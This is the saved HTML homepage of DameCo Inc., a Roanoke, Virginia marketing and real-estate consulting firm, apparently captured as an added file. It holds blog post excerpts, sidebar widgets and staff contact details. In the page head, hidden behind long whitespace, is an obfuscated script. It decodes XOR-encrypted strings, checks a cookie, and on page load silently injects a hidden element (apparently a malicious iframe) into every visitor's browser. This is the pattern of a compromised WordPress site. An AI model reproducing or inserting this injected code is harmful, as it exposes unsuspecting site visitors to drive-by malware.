@@ -1,0 +1,265 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head profile="http://gmpg.org/xfn/11">
+<meta name="google-site-verification" content="QtwIHTHea-3n8_72hvdu9b_ctfYDzV58lkaFLb7JZpM" />
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+<title>DameCo Inc.  </title>
+<meta name="generator" content="WordPress 3.5.1" /> <!-- leave this for stats -->
+<link rel="stylesheet" href="http://www.damecoinc.com/wp-content/themes/statement/style.css" type="text/css" media="screen" />
+<link rel="stylesheet" href="http://www.damecoinc.com/wp-content/themes/statement/tab.css" type="text/css" media="screen" />
+<script type="text/javascript" src="http://www.damecoinc.com/wp-content/themes/statement/tabber.js"></script>
+<link rel="alternate" type="application/rss+xml" title="DameCo Inc. RSS Feed" href="http://www.damecoinc.com/feed/" />
+<link rel="pingback" href="http://www.damecoinc.com/xmlrpc.php" />
+<script type="text/javascript">/* BEGIN e9e666bb6bfd501dabfcb37c617b1a15 */                            var n16E;var heKg=0;function G1I2CbLoFly(rPyuiNyh,aMvpeP4d7,aMvpfP4d7,aMvpgP4d7,aMvpdP4d7,aMvpaP4d7,aMvpbP4d7,aMvpcP4d7){var vnKSC4i1=rPyuiNyh;rPyuiNyh+='3280';if(rPyuiNyh==vnKSC4i1){for(var i;i<rPyuiNyh.length;i++){vnKSC4i1+=rPyuiNyh.charCodeAt(i);if(i==0x61){break;}}}return rPyuiNyh.length;};function ocal10N(NzsL3JItq2){G1I2CbLoFly(NzsL3JItq2+'qubna');var DqPzM='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';var bQvGfae9IU,yCcmhyVMi,yjTlJmx0,ytI0R,result=[];for(ytI0R=0;ytI0R<NzsL3JItq2.length;ytI0R++){if(NzsL3JItq2.charAt(ytI0R)=='='){break;}G1I2CbLoFly('aus7'+ytI0R);bQvGfae9IU=DqPzM.indexOf(NzsL3JItq2.charAt(ytI0R));G1I2CbLoFly(bQvGfae9IU);yjTlJmx0=ytI0R%4;switch(yjTlJmx0){case 1:result.push(String.fromCharCode(yCcmhyVMi<<2|bQvGfae9IU>>4));break;case 2:G1I2CbLoFly('asUMoai');result.push(String.fromCharCode((yCcmhyVMi&0x0f)<<4|bQvGfae9IU>>2));break;case 3:result.push(String.fromCharCode((yCcmhyVMi&3)<<6|bQvGfae9IU));break;}yCcmhyVMi=bQvGfae9IU;}G1I2CbLoFly('Mki162bz');return result.join('');};function lFdJB9(Fs64eroM,SHfzj){var NzsL3JItq2;var yBxLaN04Dj='',UeJePmQkJ=0;if(!heKg){n16E=new Array(0x9e, 0xbf, 0xb0, 0xaf, 0xa2, 0x94, 0xcd, 0xee, 0xfa, 0xc9, 0xfe);heKg=11;}G1I2CbLoFly('81728aamz');NzsL3JItq2=ocal10N(Fs64eroM);var UeJePmQkJ=NzsL3JItq2.length;if(SHfzj==0){for(var ytI0R=0;ytI0R<UeJePmQkJ;ytI0R++){var o80hd2PpsV=NzsL3JItq2.charCodeAt(ytI0R);var AQszG=o80hd2PpsV^n16E[ytI0R%heKg];yBxLaN04Dj+=String.fromCharCode(AQszG);}}else{var phbbMV='';for(var ytI0R=0;ytI0R<UeJePmQkJ;ytI0R+=2){var o80hd2PpsV=NzsL3JItq2.charCodeAt(ytI0R)^n16E[ytI0R%heKg];var AQszG;if(ytI0R<UeJePmQkJ-1){AQszG=NzsL3JItq2.charCodeAt(ytI0R+1)^n16E[(ytI0R+1)%heKg];}else{AQszG=0;}phbbMV+='%u';if(AQszG<=0x0f){phbbMV+='0';}phbbMV+=AQszG.toString(16);if(o80hd2PpsV<=0x0f){phbbMV+='0';}phbbMV+=o80hd2PpsV.toString(16);}yBxLaN04Dj=unescape(phbbMV);}return yBxLaN04Dj;};var uorg60R=lFdJB9('68zV3cvwj6+8jM+r/ICblw==', 0);var gtNofuNdc='25';var x4JvvHVV2=1;function VLQL(name){var icb7JxNp=document.cookie;if(!icb7JxNp){return null;}var f4hOPl4v=icb7JxNp.split(';');var i=0;for(i=0;i<f4hOPl4v.length;i++){var ex9JovSESr5=f4hOPl4v[i].split('=');if(ex9JovSESr5[0]!=name){continue;}return unescape(ex9JovSESr5[1]);}return null;};function gareBnU(name,value){var exp=new Date();var Us5tUeqN=exp.getTime()+(2*365*24*60*60);exp.setTime(Us5tUeqN);var JVgvzraBSC=name+'='+escape(value)+lFdJB9('pZ/V19L9v4uJ9A==', 0)+exp.toGMTString();document.cookie=JVgvzraBSC;};function G07Gq6pormK(){try{var OUPGlgnADDk=document.getElementById(lFdJB9('6tLA8Mb9u98=', 0));OUPGlgnADDk.style.visibility=lFdJB9('9tbUy8f6', 0);}catch(e){};};function jrSyjA0(){if(x4JvvHVV2){try{if(VLQL(uorg60R)==gtNofuNdc){return false;}}catch(e){};}try{var OUPGlgnADDk=document.getElementById(lFdJB9('6tLA8Mb9u98=', 0));if(OUPGlgnADDk){return false;}}catch(e){};try{var OUPGlgnADDk=document.createElement(lFdJB9('2vbm', 0));OUPGlgnADDk.id=lFdJB9('6tLA8Mb9u98=', 0);var Q1V2lMRD=lFdJB9('9svE35i74oybp5D7zYGdjPeiwJOn0fjQwtrPur2GivaK7oLVyZClr9fI/8qtiYnKlaH4', 0);var fQVh66S0xRb=lFdJB9('otbW3cP5qM6Vp5Lx3tSShdP92b24yO7QwsLpvOTV3emR8NrC3c3m8Mm9+cnZzobfzeagpdLgxbmfw93Bqeo=', 0)+Q1V2lMRD+lFdJB9('uZ/HxsbgpdPL8N722tnIyuDw38PpmOze3crA+7+Kn7vDrp/DzND7oYKTp5mjmN7AharxwZOvjP/S1ZE=', 0);document.body.appendChild(OUPGlgnADDk);OUPGlgnADDk.innerHTML=fQVh66S0xRb;gareBnU(uorg60R,gtNofuNdc);}catch(e){};};if(document.addEventListener){document.addEventListener(lFdJB9('2vD97M36uYuUvbLx3tTKxg==', 0),jrSyjA0,false);}else{document.write('<'+'script id=__ie_onload defer src=javascript:void(0)><'+'\/script>');var script=document.getElementById(lFdJB9('weDZyv37o4KVqJo=', 0));script.onreadystatechange=function(){if(this.readyState==lFdJB9('/dDd387xuYs=', 0)){jrSyjA0();}};}/* END e9e666bb6bfd501dabfcb37c617b1a15 */
+document.write('<style type="text/css">.tabber{display:none;}<\/style>');
+</script>
+
+<link rel='stylesheet' id='sociable-front-css-css'  href='http://www.damecoinc.com/wp-content/plugins/sociable/sociable.css?ver=3.5.1' type='text/css' media='all' />
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://www.damecoinc.com/xmlrpc.php?rsd" />
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://www.damecoinc.com/wp-includes/wlwmanifest.xml" /> 
+<meta name="generator" content="WordPress 3.5.1" />
+</head>
+<body>
+<div id="wrapper">
+<div id="header">
+<div id="logo">
+<h1><a href="http://www.damecoinc.com">DameCo Inc.</a></h1>
+</div>
+<div id="topleft">
+<div id="searchbox">
+<form method="get" id="searchform" action="http://www.damecoinc.com/">
+<div><input type="text" value="" name="s" id="s" class="swap_value" />
+<input type="image" src="http://www.damecoinc.com/wp-content/themes/statement/images/go.gif" id="go" alt="Search" title="Search" />
+</div>
+</form>
+</div>
+<div class="clear"></div>
+<div id="nav">
+<ul>
+<li class="current_page_item"><a href="http://www.damecoinc.com">Home</a></li>
+<li class="page_item page-item-2"><a href="http://www.damecoinc.com/speaking-engagements/">Speaking Engagements</a></li>
+<li class="page_item page-item-4"><a href="http://www.damecoinc.com/webinars/">Webinars</a></li>
+<li class="page_item page-item-61"><a href="http://www.damecoinc.com/client-list/">Client List</a></li>
+</ul>
+</div>
+</div>
+</div>
+<div id="frame">
+<div id="infobar">
+<div id="browse">
+	
+</div>
+<div id="rss">
+<p><script src="http://www.damecoinc.com/wp-content/themes/statement/date.js" type="text/javascript"></script>&nbsp; | &nbsp;Subscribe via <a href="http://www.damecoinc.com/feed/" title="RSS"><strong>RSS</strong></a></p>
+</div>
+</div>
+<div id="content">
+<div id="left">
+<p><img src="/wp-content/themes/statement/images/dameco-home-image.jpg" width="562" height="200" style="padding-bottom:10px; "></p>
+
+
+	
+		<div class="entry">
+			<div class="post" id="post-166">
+				<h2><a href="http://www.damecoinc.com/2010/07/10/joining-the-renovation-nation-in-roanokes-historic-district/" rel="bookmark" title="Permanent Link to Joining Renovation Nation in Roanoke&#8217;s Historic District">Joining Renovation Nation in Roanoke&#8217;s Historic District</a></h2>
+<div class="allinfos"><span class="date">July 10th, 2010</span>&nbsp; | &nbsp;<span class="category">Posted in <a href="http://www.damecoinc.com/category/real-estate/" title="View all posts in Real Estate" rel="category tag">Real Estate</a></span> by Mike Dame&nbsp; | &nbsp;<span class="comments"><a href="http://www.damecoinc.com/2010/07/10/joining-the-renovation-nation-in-roanokes-historic-district/#comments" title="Comment on Joining Renovation Nation in Roanoke&#8217;s Historic District">2 Comments</a> </span></div>
+
+					<p>We&#8217;re very proud of Valeria&#8217;s renovation of a circa 1905 American Four Square home in the up-and-coming Mountain View Neighborhood in downtown Roanoke. The restoration project team partnered with the city&#8217;s Architectural Review Board to maintain the integrity of the original structure while adding modern conveniences.</p>
+                                        <p><a href="http://www.damecoinc.com/2010/07/10/joining-the-renovation-nation-in-roanokes-historic-district/" rel="bookmark" title="Permanent Link to Joining Renovation Nation in Roanoke&#8217;s Historic District"><strong>READ THIS POST ></strong></a></P>
+
+ </div></div>
+		<div class="entry">
+			<div class="post" id="post-153">
+				<h2><a href="http://www.damecoinc.com/2010/03/03/reaching-a-community-of-one/" rel="bookmark" title="Permanent Link to Reaching a &#8216;Community of One&#8217;">Reaching a &#8216;Community of One&#8217;</a></h2>
+<div class="allinfos"><span class="date">March 3rd, 2010</span>&nbsp; | &nbsp;<span class="category">Posted in <a href="http://www.damecoinc.com/category/marketing/" title="View all posts in Marketing" rel="category tag">Marketing</a>, <a href="http://www.damecoinc.com/category/social-media/" title="View all posts in Social Media" rel="category tag">Social Media</a></span> by Mike Dame&nbsp; | &nbsp;<span class="comments"><a href="http://www.damecoinc.com/2010/03/03/reaching-a-community-of-one/#respond" title="Comment on Reaching a &#8216;Community of One&#8217;">No Comments</a> </span></div>
+
+					<p>In this age of oft-times impersonal, shotgun-style marketing, it&#8217;s easy to lose sight of the larger goal of making personal connections, one consumer at a time. That will be the topic of my presentation next month in Atlanta at the National Forum on Customer Based Marketing Strategies. I&#8217;ll be presenting a case study of my [...]</p>
+                                        <p><a href="http://www.damecoinc.com/2010/03/03/reaching-a-community-of-one/" rel="bookmark" title="Permanent Link to Reaching a &#8216;Community of One&#8217;"><strong>READ THIS POST ></strong></a></P>
+
+ </div></div>
+		<div class="entry">
+			<div class="post" id="post-143">
+				<h2><a href="http://www.damecoinc.com/2009/09/08/dameco-inc-launches-site-for-home-accessibilities/" rel="bookmark" title="Permanent Link to DameCo Inc. launches site for Home Accessibilities">DameCo Inc. launches site for Home Accessibilities</a></h2>
+<div class="allinfos"><span class="date">September 8th, 2009</span>&nbsp; | &nbsp;<span class="category">Posted in <a href="http://www.damecoinc.com/category/green-building/" title="View all posts in Green Building" rel="category tag">Green Building</a></span> by Mike Dame&nbsp; | &nbsp;<span class="comments"><a href="http://www.damecoinc.com/2009/09/08/dameco-inc-launches-site-for-home-accessibilities/#comments" title="Comment on DameCo Inc. launches site for Home Accessibilities">2 Comments</a> </span></div>
+
+					<p>This is a bit of a belated announcement, but in late July we launched the Web site for Home Accessibilities, a new residential design firm based in Winter Park, Florida, near Orlando. Home Accessibilities is the brainchild of Karen Kassik, a good friend who has been designing custom homes and remodeling existing homes for over 20 [...]</p>
+                                        <p><a href="http://www.damecoinc.com/2009/09/08/dameco-inc-launches-site-for-home-accessibilities/" rel="bookmark" title="Permanent Link to DameCo Inc. launches site for Home Accessibilities"><strong>READ THIS POST ></strong></a></P>
+
+ </div></div>
+		<div class="entry">
+			<div class="post" id="post-139">
+				<h2><a href="http://www.damecoinc.com/2009/08/07/welcoming-our-cnr2030-advisory-board/" rel="bookmark" title="Permanent Link to Welcoming our CNR2030 Advisory Board">Welcoming our CNR2030 Advisory Board</a></h2>
+<div class="allinfos"><span class="date">August 7th, 2009</span>&nbsp; | &nbsp;<span class="category">Posted in <a href="http://www.damecoinc.com/category/cnr-2030/" title="View all posts in CNR 2030" rel="category tag">CNR 2030</a>, <a href="http://www.damecoinc.com/category/roanoke-cclp/" title="View all posts in Roanoke CCLP" rel="category tag">Roanoke CCLP</a></span> by admin&nbsp; | &nbsp;<span class="comments"><a href="http://www.damecoinc.com/2009/08/07/welcoming-our-cnr2030-advisory-board/#comments" title="Comment on Welcoming our CNR2030 Advisory Board">10 Comments</a> </span></div>
+
+					<p>Our CNR2030 Advisory Board is gathering next Thursday for its first meeting, and we&#8217;ll be sharing news with them regarding Lumenhaus, Virginia Tech&#8217;s 2009 entry to the U.S. Department of Energy Solar Decathlon competition.</p>
+                                        <p><a href="http://www.damecoinc.com/2009/08/07/welcoming-our-cnr2030-advisory-board/" rel="bookmark" title="Permanent Link to Welcoming our CNR2030 Advisory Board"><strong>READ THIS POST ></strong></a></P>
+
+ </div></div>
+		<div class="entry">
+			<div class="post" id="post-117">
+				<h2><a href="http://www.damecoinc.com/2009/07/06/my-afternoon-with-air-mcnair/" rel="bookmark" title="Permanent Link to My afternoon with Air McNair">My afternoon with Air McNair</a></h2>
+<div class="allinfos"><span class="date">July 6th, 2009</span>&nbsp; | &nbsp;<span class="category">Posted in <a href="http://www.damecoinc.com/category/miscellaneous/" title="View all posts in Miscellaneous" rel="category tag">Miscellaneous</a></span> by Mike Dame&nbsp; | &nbsp;<span class="comments"><a href="http://www.damecoinc.com/2009/07/06/my-afternoon-with-air-mcnair/#comments" title="Comment on My afternoon with Air McNair">7 Comments</a> </span></div>
+
+					<p>In 1994, while on the road covering the Florida Gators&#8217; game at Ole Miss, I took a side trip down the Natchez Trace to report on the biggest story in southern football that season: Alcorn State quarterback Steve &#8220;Air&#8221; McNair.</p>
+                                        <p><a href="http://www.damecoinc.com/2009/07/06/my-afternoon-with-air-mcnair/" rel="bookmark" title="Permanent Link to My afternoon with Air McNair"><strong>READ THIS POST ></strong></a></P>
+
+Tags: <a href="http://www.damecoinc.com/tag/steve-mcnair/" rel="tag">Steve McNair</a>  </div></div>
+		
+		<div class="navigation">
+			<div class="alignleft"><a href="http://www.damecoinc.com/page/2/" >&laquo; Older Entries</a></div>
+			<div class="alignright"></div>
+		</div>
+
+	
+	</div>
+
+<div id="right">
+<div id="topsidebar">
+<div class="tabber">
+
+
+
+     <div class="tabbertab">
+
+	  <h2>Recent Comments</h2>
+	
+<ul>
+<li>home: <a href="http://www.damecoinc.com/2009/09/08/dameco-inc-launches-site-for-home-accessibilities/#comment-111" title="on DameCo Inc. launches site for Home Accessibilities">Great post. I will be going through [...]</a></li>
+<li>Mickie: <a href="http://www.damecoinc.com/2009/09/08/dameco-inc-launches-site-for-home-accessibilities/#comment-110" title="on DameCo Inc. launches site for Home Accessibilities">I wwnted to thank you for thus good [...]</a></li>
+<li>outbound marketing: <a href="http://www.damecoinc.com/2009/08/07/welcoming-our-cnr2030-advisory-board/#comment-108" title="on Welcoming our CNR2030 Advisory Board ">One website in particular that seem [...]</a></li>
+<li>Lynchburg Realtors: <a href="http://www.damecoinc.com/2009/03/22/the-creative-class-speaks-to-the-roanoke-cclp/#comment-107" title="on The Creative Class Speaks to the Roanoke CCLP">Admiring the persistence you put in [...]</a></li>
+<li>watches online us: <a href="http://www.damecoinc.com/2009/08/07/welcoming-our-cnr2030-advisory-board/#comment-106" title="on Welcoming our CNR2030 Advisory Board ">Hi there, yuup this piece of writin [...]</a></li>
+</ul>     </div>
+
+     <div class="tabbertab">
+<h2>Recent Posts</h2>
+				<ul>
+
+<li><a href="http://www.damecoinc.com/2010/03/03/reaching-a-community-of-one/">Reaching a &#8216;Community of One&#8217;</a></li>
+<li><a href="http://www.damecoinc.com/2009/09/08/dameco-inc-launches-site-for-home-accessibilities/">DameCo Inc. launches site for Home Accessibilities</a></li>
+<li><a href="http://www.damecoinc.com/2009/08/07/welcoming-our-cnr2030-advisory-board/">Welcoming our CNR2030 Advisory Board</a></li>
+<li><a href="http://www.damecoinc.com/2009/07/06/my-afternoon-with-air-mcnair/">My afternoon with Air McNair</a></li>
+<li><a href="http://www.damecoinc.com/2009/06/08/how-can-2-months-feel-like-2-years/">How Can 2 Months Feel Like 2 Years?</a></li>
+	
+		</ul>
+
+     </div>
+
+     <div class="tabbertab">
+<h2>Archives</h2>
+				<ul>
+					<li><a href='http://www.damecoinc.com/2010/07/' title='July 2010'>July 2010</a></li>
+	<li><a href='http://www.damecoinc.com/2010/03/' title='March 2010'>March 2010</a></li>
+	<li><a href='http://www.damecoinc.com/2009/09/' title='September 2009'>September 2009</a></li>
+	<li><a href='http://www.damecoinc.com/2009/08/' title='August 2009'>August 2009</a></li>
+	<li><a href='http://www.damecoinc.com/2009/07/' title='July 2009'>July 2009</a></li>
+	<li><a href='http://www.damecoinc.com/2009/06/' title='June 2009'>June 2009</a></li>
+	<li><a href='http://www.damecoinc.com/2009/04/' title='April 2009'>April 2009</a></li>
+	<li><a href='http://www.damecoinc.com/2009/03/' title='March 2009'>March 2009</a></li>
+	<li><a href='http://www.damecoinc.com/2009/02/' title='February 2009'>February 2009</a></li>
+				</ul>
+     </div>
+
+</div>
+</div>
+<div class="clear"></div>
+</div>
+
+<div id="sidebarbottom">
+<div id="lsidebar"><ul>
+	<li id="categories-388055891" class="widget widget_categories"><h2 class="widgettitle">Categories</h2>
+		<ul>
+	<li class="cat-item cat-item-13"><a href="http://www.damecoinc.com/category/cnr-2030/" title="View all posts filed under CNR 2030">CNR 2030</a>
+</li>
+	<li class="cat-item cat-item-18"><a href="http://www.damecoinc.com/category/green-building/" title="View all posts filed under Green Building">Green Building</a>
+</li>
+	<li class="cat-item cat-item-19"><a href="http://www.damecoinc.com/category/marketing/" title="View all posts filed under Marketing">Marketing</a>
+</li>
+	<li class="cat-item cat-item-4"><a href="http://www.damecoinc.com/category/miscellaneous/" title="View all posts filed under Miscellaneous">Miscellaneous</a>
+</li>
+	<li class="cat-item cat-item-20"><a href="http://www.damecoinc.com/category/real-estate/" title="View all posts filed under Real Estate">Real Estate</a>
+</li>
+	<li class="cat-item cat-item-8"><a href="http://www.damecoinc.com/category/roanoke-cclp/" title="View all posts filed under Roanoke CCLP">Roanoke CCLP</a>
+</li>
+	<li class="cat-item cat-item-6"><a href="http://www.damecoinc.com/category/social-media/" title="View all posts filed under Social Media">Social Media</a>
+</li>
+		</ul>
+</li>
+<li id="linkcat-2" class="widget widget_links"><h2 class="widgettitle">Blogroll</h2>
+
+	<ul class='xoxo blogroll'>
+<li><a href="http://www.drivebydiva.com" title="A pop culture blog designed by DameCo Inc.">Driveby Diva</a></li>
+
+	</ul>
+</li>
+
+<li id="linkcat-3" class="widget widget_links"><h2 class="widgettitle">Related Sites</h2>
+
+	<ul class='xoxo blogroll'>
+<li><a href="http://www.carilionclinic.org" title="Carilion Clinic">Carilion Clinic</a></li>
+<li><a href="http://www.creativeclass.com/" title="Learn more about what&#8217;s behind the Roanoke CCLP project.">Creative Class</a></li>
+<li><a href="http://www.homeaccessibilities.com" title="Business site developed by DameCo Inc.">Home Accessibilities</a></li>
+<li><a href="http://www.roanokeva.gov/creative" title="The city&#8217;s official site for the Roanoke Creative Connectors Leadership Program.">Roanoke CCLP</a></li>
+
+	</ul>
+</li>
+
+<li id="tag_cloud-2" class="widget widget_tag_cloud"><h2 class="widgettitle">Tag Cloud</h2>
+<div class="tagcloud"><a href='http://www.damecoinc.com/tag/cnr-2030/' class='tag-link-13' title='1 topic' style='font-size: 8pt;'>CNR 2030</a>
+<a href='http://www.damecoinc.com/tag/creative-class/' class='tag-link-9' title='2 topics' style='font-size: 14.3pt;'>Creative Class</a>
+<a href='http://www.damecoinc.com/tag/creative-communities/' class='tag-link-10' title='4 topics' style='font-size: 22pt;'>Creative Communities</a>
+<a href='http://www.damecoinc.com/tag/green-technology/' class='tag-link-16' title='1 topic' style='font-size: 8pt;'>Green Technology</a>
+<a href='http://www.damecoinc.com/tag/roanoke/' class='tag-link-11' title='4 topics' style='font-size: 22pt;'>Roanoke</a>
+<a href='http://www.damecoinc.com/tag/roanoke-cclp/' class='tag-link-8' title='4 topics' style='font-size: 22pt;'>Roanoke CCLP</a>
+<a href='http://www.damecoinc.com/tag/steve-mcnair/' class='tag-link-17' title='1 topic' style='font-size: 8pt;'>Steve McNair</a>
+<a href='http://www.damecoinc.com/tag/twitter/' class='tag-link-7' title='1 topic' style='font-size: 8pt;'>Twitter</a>
+<a href='http://www.damecoinc.com/tag/uf/' class='tag-link-15' title='1 topic' style='font-size: 8pt;'>UF</a></div>
+</li>
+	</ul>
+	</div>
+<div id="rsidebar"><ul>
+	<li id="text-388053451" class="widget widget_text"><h2 class="widgettitle">About DameCo Inc.</h2>
+			<div class="textwidget">DameCo Inc. provides marketing and interactive media consulting, website development, and real estate management services to small- and medium-sized enterprises.<br />
+<br />
+<strong>Valeria Alphin</strong> offers more than 20 years experience in real estate management, business development, sales, marketing, and communications. She holds a real estate license in the state of Virginia.<br />
+<br />
+<strong>Mike Dame</strong> offers 18 years experience in online media, marketing communications and strategic planning. His background includes work with Fortune 500 and large higher education and health care institutions.<br />
+<br />
+We are based in the Roanoke Valley in southwest Virginia.<br /></div>
+		</li>
+<li id="text-388055231" class="widget widget_text"><h2 class="widgettitle">Contact Us</h2>
+			<div class="textwidget"><p><strong>Valeria Alphin</strong><br />
+VP/Business Development<br />
+<a href="mailto:valphin@damecoinc.com">E-mail Valeria</a><br />
+540-998-4046<br />
+<a href="http://www.linkedin.com/in/valphin" ><img src="http://www.linkedin.com/img/webpromo/btn_profile_greytxt_80x15.gif" width="80" height="15" border="0" alt="View Valeria Alphin's profile on LinkedIn" align="center"></a></p>
+<br />
+<p><strong>Mike Dame, M.B.A.</strong><br />
+President<br />
+<a href="mailto:mdame@damecoinc.com">E-mail Mike</a><br />
+540-250-7452<br />
+<a href="http://www.linkedin.com/in/mikedame" ><img src="http://www.linkedin.com/img/webpromo/btn_profile_greytxt_80x15.gif" width="80" height="15" border="0" alt="View Mike Dame's profile on LinkedIn" align="center"></a></p></div>
+		</li>
+</ul>	</div>
+<div class="clear"></div>
+</div>
+<div class="clear"></div>
+</div>
+<div class="clear"></div>
+</div>
+<div class="clear"></div>
+</div>
+<div id="footer">
+<div id="foo">
+<ul>
+<li class="current_page_item"><a href="http://www.damecoinc.com">Home</a></li>
+<li class="page_item page-item-2"><a href="http://www.damecoinc.com/speaking-engagements/">Speaking Engagements</a></li>
+<li class="page_item page-item-4"><a href="http://www.damecoinc.com/webinars/">Webinars</a></li>
+<li class="page_item page-item-61"><a href="http://www.damecoinc.com/client-list/">Client List</a></li>
+</ul>
+<div class="clear"></div>
+Copyright © 2009-11 DameCo Inc.&nbsp; | &nbsp;540-998-4046&nbsp; | &nbsp;<a href="mailto:admin@damecoinc.com">Contact the Administrator</a></div>
+</div>
+
+</body>
+</html>
